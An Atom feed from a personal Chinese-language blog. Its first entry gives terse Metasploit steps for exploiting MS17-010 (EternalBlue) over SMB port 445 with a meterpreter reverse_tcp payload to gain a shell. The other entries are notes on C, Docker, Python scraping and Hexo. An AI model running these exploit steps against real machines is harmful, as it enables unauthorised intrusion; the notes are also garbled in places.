<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-05-23T16:23:22.179Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>隐身</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ms17-010</title>
    <link href="http://yoursite.com/2020/05/23/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/"/>
    <id>http://yoursite.com/2020/05/23/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/</id>
    <published>2020-05-23T09:58:36.000Z</published>
    <updated>2020-05-23T16:23:22.179Z</updated>
    
    <content type="html"><![CDATA[<h1 id="信息收集阶段"><a href="#信息收集阶段" class="headerlink" title="信息收集阶段"></a>信息收集阶段</h1><pre><code class="bash">scanner查看扫描模块以syn为例子 use auxiliary/scanner/portscan/syn <span class="built_in">set</span> RHPSTS ip and ports 0-500run 永恒之蓝利用445端口 smb服务 操作系统溢出漏洞</code></pre><h1 id="或者可以使用nmap扫描-nmap-sV-ip地址"><a href="#或者可以使用nmap扫描-nmap-sV-ip地址" class="headerlink" title="或者可以使用nmap扫描 nmap -sV ip地址"></a>或者可以使用nmap扫描 nmap -sV ip地址</h1><h1 id="尝试攻击"><a href="#尝试攻击" class="headerlink" title="尝试攻击"></a>尝试攻击</h1><h2 id="查看漏洞模块"><a href="#查看漏洞模块" class="headerlink" title="查看漏洞模块"></a>查看漏洞模块</h2><p>查看漏洞模块——search ms17-010<br>可以先使用辅助扫描模块测试 use auxiliary/scanner/smb/smb_ms17_010<br>    set payload ：设置payload，这里用set payload windows/x64/meterpreter/reverse_tcp<br>    要选用其他payload可以使用show payloads查看适合要攻击的目标主机的payload</p><pre><code>## show options ：使用该命令会列出使用当前模块所需呀配置的参数### set RHOST 目标主机地址 ：该命令会设置好要攻击的目标主机地址### set LHOST 攻击机地址 ：该命令设置攻击机的地址，使目标主机回连至攻击机### set LPORT 回连的端口 ：该命令设置目标主机回连至攻击机的端口，默认为4444### run：开始攻击</code></pre><h1 id="使用攻击模块进行攻击-use-exploit-windows-smb-ms17-010-eternalblue"><a href="#使用攻击模块进行攻击-use-exploit-windows-smb-ms17-010-eternalblue" class="headerlink" title="使用攻击模块进行攻击 use exploit/windows/smb/ms17_010_eternalblue"></a>使用攻击模块进行攻击 use exploit/windows/smb/ms17_010_eternalblue</h1><h3 id="成功后会得到一个shell"><a href="#成功后会得到一个shell" class="headerlink" title="成功后会得到一个shell"></a>成功后会得到一个shell</h3><h3 id="到这里漏洞攻击已经成功"><a href="#到这里漏洞攻击已经成功" class="headerlink" title="到这里漏洞攻击已经成功"></a>到这里漏洞攻击已经成功</h3><p> meterpreter汉字乱码问题<br>成因  linux默认是utf-8编码  换成gbk即可</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;信息收集阶段&quot;&gt;&lt;a href=&quot;#信息收集阶段&quot; class=&quot;headerlink&quot; title=&quot;信息收集阶段&quot;&gt;&lt;/a&gt;信息收集阶段&lt;/h1&gt;&lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;scanner查看扫描模块
以syn为例子 use auxilia
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>c语言基础</title>
    <link href="http://yoursite.com/2020/04/16/c%E8%AF%AD%E8%A8%80/"/>
    <id>http://yoursite.com/2020/04/16/c%E8%AF%AD%E8%A8%80/</id>
    <published>2020-04-16T10:19:47.000Z</published>
    <updated>2020-05-20T10:50:52.765Z</updated>
    
    <content type="html"><![CDATA[<h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><a id="more"></a><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int x,z,y 定义为基本整形</span><br><span class="line">long x,z,t 定义为长整形</span><br><span class="line"><span class="built_in">float</span>单精度 double双精度  long double 长双精度</span><br><span class="line">char字符变量 一般占用1字节内存</span><br></pre></td></tr></table></figure><h3 id="赋值与类型转换"><a href="#赋值与类型转换" class="headerlink" title="赋值与类型转换"></a>赋值与类型转换</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">赋值</span><br><span class="line">int x=5 int x=3 `y=3 </span><br><span class="line">类型自动转换</span><br><span class="line">两边数据类型不同时 将丢失一部分数据 丢失的部分按四舍五入计算</span><br><span class="line">强制转换</span><br><span class="line">（类型说明符）（表达式); (int)(x+y);</span><br><span class="line">结合性的作用是当某几个运算符的优先级相同时决定先执行那个</span><br><span class="line">+（右结合） -*/%（左结合）</span><br><span class="line">在声明变量中不允许连续给多个变量赋值 而赋值语句允许给多个变量赋值</span><br><span class="line">格式化输出 </span><br><span class="line">putchar(c)一次获取一个字符输出</span><br><span class="line">getchar（c）</span><br><span class="line"><span class="built_in">printf</span>（格式控制 ,输出表列） <span class="built_in">print</span>（<span class="string">"%d,%d"</span>,a,b）</span><br><span class="line">格式控制</span><br><span class="line">d格式字符 用来输出十进制整数   %d</span><br><span class="line">%md m为指定输出字段得到宽度 如果数据小于m则左端补空格 若大于m则按实际输出</span><br><span class="line">%ld输出长整形数据</span><br><span class="line">%o 格式字符以八进制形式输出整数  </span><br><span class="line"> %lo %mo</span><br><span class="line"> x格式字符 以十六进制形式输出字符</span><br><span class="line"> c用来输出一个字符</span><br><span class="line"> s输出字符串</span><br><span class="line"> e以指数形式输出实型数据</span><br><span class="line"> g输出实数</span><br><span class="line"> scanf…………………………</span><br></pre></td></tr></table></figure><h3 id="顺序和选择结构"><a href="#顺序和选择结构" class="headerlink" title="顺序和选择结构"></a>顺序和选择结构</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>()</span><br><span class="line">……</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>()</span><br><span class="line">……</span><br><span class="line"><span class="keyword">else</span> ……</span><br><span class="line"></span><br><span class="line">三目运算符 表达式1？语句1：语句2</span><br><span class="line"></span><br><span class="line">switch（表达式）</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> 常量表达式：</span><br><span class="line">语句1；</span><br><span class="line"><span class="built_in">break</span>；</span><br><span class="line"><span class="keyword">case</span> 常量表达式2</span><br><span class="line">语句2;</span><br><span class="line">breakk;</span><br><span class="line">default:</span><br><span class="line">语句n </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>（表达式）&#123; </span><br><span class="line">语句……</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">循环体</span><br><span class="line"><span class="keyword">while</span>（表达式）</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>（表达式1，表达式2，表达式3） 语句</span><br><span class="line"><span class="keyword">for</span>循环使用逗号运算符 实现两个或者以上的变量共同实现对循环的控制</span><br><span class="line"></span><br><span class="line">转移语句 goto <span class="built_in">break</span> <span class="built_in">continue</span></span><br></pre></td></tr></table></figure><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">类型说明符 数组名[常量] 数组必须先定义再使用</span><br><span class="line">数组可以不指定长度</span><br><span class="line">字符串要用<span class="string">""</span>引起来</span><br><span class="line">%s格式化输出字符串时 <span class="built_in">printf</span>输出项是字符数组名 不是数组元素名```</span><br></pre></td></tr></table></figure><h3 id="字符串处理函数"><a href="#字符串处理函数" class="headerlink" title="字符串处理函数"></a>字符串处理函数</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">调用一下函数头文件应包含stdio.h</span><br><span class="line">puts（字符数组名） 把字符数组输出到屏幕上</span><br><span class="line">gets（字符数组名） 字符串输入函数</span><br><span class="line">strcat（字符数组1,字符数组2）字符串连接函数</span><br><span class="line">strcpy（字符数组1,字符数组2） 字符复制函数</span><br><span class="line">strcmp（）字符串比较函数 用ascll顺序比较 等于放回0 大于返回正数 小于返回负数</span><br><span class="line">strlwr（）字符串转换为小写字母</span><br><span class="line">strupr（）字符串转换为大写字母</span><br></pre></td></tr></table></figure><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">函数定义</span><br><span class="line">类型说明符 函数名()</span><br><span class="line">&#123; </span><br><span class="line">声明部分</span><br><span class="line">语句</span><br><span class="line">&#125;</span><br><span class="line">数组名作为函数参数时 应该在主调函数和被调函数中分别定义数组</span><br></pre></td></tr></table></figure><h3 id="库函数"><a href="#库函数" class="headerlink" title="库函数"></a>库函数</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">int abs（long x）函数 求绝对值的函数</span><br><span class="line">long labs 长整型绝对值</span><br><span class="line">double labs 浮点数的绝对值</span><br><span class="line">double sin ，cos， tan</span><br><span class="line">指数对数 exp <span class="built_in">log</span> log10</span><br><span class="line">字符函数 使用字符函数时要包含头文件&lt;ctype.h&gt;</span><br><span class="line">int isalphs(int ch)如果ch是字母则返回非零值 否则返回0</span><br><span class="line">int isdigit(int ch)如果ch是数字则返回非零值 否则返回0</span><br><span class="line">int isalnum(int ch)检测字母或者数字</span><br><span class="line">strchr</span><br></pre></td></tr></table></figure><h3 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">一个变量专门用来存放另外一个变量的地址则称为指针变量  定义完指针变量再复制 不要加“*”</span><br><span class="line">类型说明 *变量名 *表示这是一个指针变量</span><br><span class="line">定义指针汴梁复制 </span><br><span class="line">int a;</span><br><span class="line">int *p=&amp;a;</span><br><span class="line">指针变量的引用：*指针变量</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;数据类型&quot;&gt;&lt;a href=&quot;#数据类型&quot; class=&quot;headerlink&quot; title=&quot;数据类型&quot;&gt;&lt;/a&gt;数据类型&lt;/h3&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>docker</title>
    <link href="http://yoursite.com/2020/04/09/docker/"/>
    <id>http://yoursite.com/2020/04/09/docker/</id>
    <published>2020-04-09T07:54:04.000Z</published>
    <updated>2020-04-09T08:51:35.022Z</updated>
    
    <content type="html"><![CDATA[<h1 id="docker-常用命令"><a href="#docker-常用命令" class="headerlink" title="docker 常用命令"></a>docker 常用命令</h1><a id="more"></a><p>service docker restart #重启docker</p><p> docker images 列出本地镜像</p><ul><li>-q只显示镜像id，-a列出本地所有镜像 –digests显示镜像的摘要信息 –no-trunc显示完整信息<br>docker run 创建一个新的容器并运行</li><li>-it交互式运行  -d后台运行并返回id -p指定端口映射<br>docker search crntos -s 30 列出点赞数超过30的指定镜像<br>docker start 启动一个或者多个停止的容器<br>docker stop停止容器<br>docker rm删除一个或者多个容器 -f<br>docker kill杀死一个容器<br>docker exec在运行的容器中执行命令 -d -i -t<br>docker pull 拉取镜像<br>docker build 创建镜像</li><li>-f指定dockerfile路径 –pull 更新镜像 –network指定run的网络<br>docker commit将容器固化成一个新的镜像<br>docker ps -q -a<br>docker rename 重命名<br>docker cp容器主机之间的数据拷贝</li></ul><h1 id="dockerfile"><a href="#dockerfile" class="headerlink" title="dockerfile"></a>dockerfile</h1><p>docker build -t dockerfile –network=host -t name .<br>docker run -tid –name test –privileged=true ubuntu:18.04 /sbin/init<br>docker exec -it test /bin/bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">FROM 基础镜像 当前新镜像是基于那个镜像</span><br><span class="line">MAINTAINER 镜像维护者的姓名和邮箱</span><br><span class="line">RUN 容器构建时需要运行的命令</span><br><span class="line">EXPOSE 当前容器对外暴露的端口</span><br><span class="line">WORKDIR 指定创建的容器后 终端默认登录进来的工作目录</span><br><span class="line">ENV用来构建镜像过程设置环境变量</span><br><span class="line">ADD在宿主机目录下的文件拷贝进镜像且add命令自动处理url和解压tar压缩包</span><br><span class="line">COPY 源路径的文件、目录复制到新的一层镜像内&lt;目录路径&gt;</span><br><span class="line">VOLUME容器数据卷 用于数据保存和持久化工作</span><br><span class="line">CMD指定一个容器启动时要运行的命令 可以有多个但只有最后一个生效</span><br><span class="line">ENTRYPOINT指定一个容器启动时要运行的命令</span><br><span class="line">ONBUILD当构建一个被继承的dockerfile时运行命令 父镜像咋子被子继承后父镜像的onbuild被触发</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;docker-常用命令&quot;&gt;&lt;a href=&quot;#docker-常用命令&quot; class=&quot;headerlink&quot; title=&quot;docker 常用命令&quot;&gt;&lt;/a&gt;docker 常用命令&lt;/h1&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>py web spider</title>
    <link href="http://yoursite.com/2020/04/04/%E7%88%AC%E8%99%AB%E5%9F%BA%E7%A1%80/"/>
    <id>http://yoursite.com/2020/04/04/%E7%88%AC%E8%99%AB%E5%9F%BA%E7%A1%80/</id>
    <published>2020-04-04T11:32:21.000Z</published>
    <updated>2020-05-20T10:49:20.713Z</updated>
    
    <content type="html"><![CDATA[<h1 id="requests库请求"><a href="#requests库请求" class="headerlink" title="requests库请求"></a>requests库请求</h1><a id="more"></a><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get请求a=requests.get(<span class="string">'http://127.0.0.1'</span>)</span><br><span class="line">post请求a=requests.post(<span class="string">'https://127.0.0.1'</span>,data=&#123;<span class="string">'key'</span>:<span class="string">'vaule'</span>&#125;)</span><br></pre></td></tr></table></figure><h3 id="请求头伪装"><a href="#请求头伪装" class="headerlink" title="请求头伪装"></a>请求头伪装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">headers=&#123;<span class="string">'user-agent'</span>:<span class="string">'xxxxx'</span>&#125;</span><br><span class="line">a=requests.get(url,headers=headers)</span><br></pre></td></tr></table></figure><h3 id="BeautifulSoup"><a href="#BeautifulSoup" class="headerlink" title="BeautifulSoup"></a>BeautifulSoup</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a=BeautifulSoup(html,<span class="string">'lxml'</span>)</span><br><span class="line">获取标题内容:a.soup.title.string</span><br><span class="line">获取a标签的内容:a.p.string</span><br><span class="line">获取所有a标签：a.find_all(<span class="string">'a'</span>)</span><br><span class="line">获取id为xxx的标签：a.find(id=<span class="string">"xxx"</span>)</span><br></pre></td></tr></table></figure><h3 id="xpath表达式"><a href="#xpath表达式" class="headerlink" title="xpath表达式"></a>xpath表达式</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pip install lxml</span><br><span class="line">import lxml </span><br><span class="line">a=html.xpath(<span class="string">'//div[@class="text"]/h2/a/'</span>)</span><br><span class="line">/       <span class="comment"># 逐层提取s</span></span><br><span class="line">text（）<span class="comment">#提取标签下面的文本</span></span><br><span class="line">//标签名**提取所有标签为**的标签</span><br><span class="line">//标签名[@属性=<span class="string">'属性值'</span>]<span class="comment">#提取所有属性为属性值的标签</span></span><br><span class="line">@属性名 <span class="comment">#代表取某个人属性值</span></span><br></pre></td></tr></table></figure><h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">f=open(<span class="string">'文件路径'</span>，<span class="string">'w文件操作方式'</span>)</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">with open(<span class="string">'文件路径'</span>，<span class="string">'操作方式'</span>) as f:</span><br><span class="line">对文件进行的操作</span><br><span class="line">f.readlines() <span class="comment">#  按行读取</span></span><br><span class="line">f.write(<span class="string">"一大段文字"</span>)<span class="comment">#文件写入</span></span><br></pre></td></tr></table></figure><h3 id="multiprocessing"><a href="#multiprocessing" class="headerlink" title="multiprocessing"></a>multiprocessing</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">multiprocessing下有个dummy模块下有个pool类</span><br><span class="line">from multiprocessing.dummy import Pool</span><br><span class="line">def qu(url):</span><br><span class="line">requests.get(url)</span><br><span class="line">url=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(100):</span><br><span class="line">url.appned(<span class="string">"http://127.0.0.1"</span>)</span><br><span class="line">pool=pool(5)</span><br><span class="line">pool.map(qu,url)</span><br><span class="line">map()<span class="comment">#方法接受两个参数 第一个是函数名字 2是迭代对象</span></span><br></pre></td></tr></table></figure><h3 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pip install redis</span><br><span class="line">import redis</span><br><span class="line">c=redis.StrictRedis(host=<span class="string">'127.0.0.1'</span>,port=2739,password=<span class="string">'12345'</span>)<span class="comment">#连接redis</span></span><br><span class="line">c.lpush(<span class="string">'chapter_6'</span>,123)<span class="comment">#把123放到chapter_6列表的左侧</span></span><br><span class="line">v=c.lpop(<span class="string">'chapter_6'</span>)<span class="comment">#在列表左侧读取一个值</span></span><br><span class="line">c.sadd(<span class="string">'test'</span>,<span class="string">'www.baidu.com'</span>)<span class="comment">#往集合添加一个网址</span></span><br><span class="line">url=c.spop(<span class="string">'url'</span>)<span class="comment">#从集合读取一个值</span></span><br><span class="line">length=c.scard(<span class="string">'url'</span>)<span class="comment">#查看集合长度</span></span><br></pre></td></tr></table></figure><p>###</p><pre><code class="bash"></code></pre><p>###<br>###<br>###<br>###<br>###</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;requests库请求&quot;&gt;&lt;a href=&quot;#requests库请求&quot; class=&quot;headerlink&quot; title=&quot;requests库请求&quot;&gt;&lt;/a&gt;requests库请求&lt;/h1&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Get up keep moving</title>
    <link href="http://yoursite.com/2020/03/30/hello-world/"/>
    <id>http://yoursite.com/2020/03/30/hello-world/</id>
    <published>2020-03-30T00:37:02.968Z</published>
    <updated>2020-04-09T08:34:21.251Z</updated>
    
    <content type="html"><![CDATA[<p>Life moves pretty fast. If you don’t stop and look around once in a while,you could miss it<br><img src="/img/1.jpg" alt="alt 图片"></p><h3 id="For-what-it’s-worth-it’s-never-too-late"><a href="#For-what-it’s-worth-it’s-never-too-late" class="headerlink" title="For what it’s worth it’s never too late"></a>For what it’s worth it’s never too late</h3><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><a id="more"></a><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Life moves pretty fast. If you don’t stop and look around once in a while,you could miss it&lt;br&gt;&lt;img src=&quot;/img/1.jpg&quot; alt=&quot;alt 图片&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;For-what-it’s-worth-it’s-never-too-late&quot;&gt;&lt;a href=&quot;#For-what-it’s-worth-it’s-never-too-late&quot; class=&quot;headerlink&quot; title=&quot;For what it’s worth it’s never too late&quot;&gt;&lt;/a&gt;For what it’s worth it’s never too late&lt;/h3&gt;&lt;h2 id=&quot;Quick-Start&quot;&gt;&lt;a href=&quot;#Quick-Start&quot; class=&quot;headerlink&quot; title=&quot;Quick Start&quot;&gt;&lt;/a&gt;Quick Start&lt;/h2&gt;
    
    </summary>
    
    
    
  </entry>
  
</feed>
